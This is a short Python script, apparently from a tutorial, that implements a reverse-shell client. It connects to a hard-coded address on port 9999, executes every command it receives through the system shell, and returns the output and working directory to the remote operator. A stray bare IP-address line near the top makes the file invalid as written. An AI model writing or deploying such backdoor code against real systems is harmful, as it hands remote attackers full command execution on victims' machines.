import socket
import os
import subprocess
192.168.18.5

s = socket.socket()
host = '192.168.1.13'
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        
    if len(data) > 0 :
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell = True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        #Popen opens the process which executes the statement inside it
        #here we send 2 outputs which will be recieved as client response
        #1. bytes character(sent to the server)
        #2. is the string (displayed)
        output_byte = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output_byte,"utf=8")
        currentWD = os.getcwd() +">"
        s.send(str.encode(output_str+currentWD)) 
        #now we also want to send the current working directory along with the output str
        print(output_str)
        
